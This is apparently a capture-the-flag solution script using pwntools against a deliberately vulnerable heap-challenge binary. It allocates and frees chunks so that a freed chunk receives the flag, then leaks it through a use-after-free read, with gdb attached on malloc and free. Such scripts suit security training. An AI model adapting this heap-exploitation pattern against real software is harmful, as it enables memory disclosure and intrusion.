#!/usr/bin/env python3

from pwn import *

binary = './toddlerheap_level3.1_patched'

p = process(binary)

s = '''
b malloc
b free
'''



for i in range(5):
	p.sendline(f"malloc {i} 1336")

p.sendline(f"malloc 7 1200")
	
for i in range(5):
	p.sendline(f"free {i}")



p.sendline(f"read_flag")


p.sendline(f"puts 4")




gdb.attach(p, s)
p.interactive()
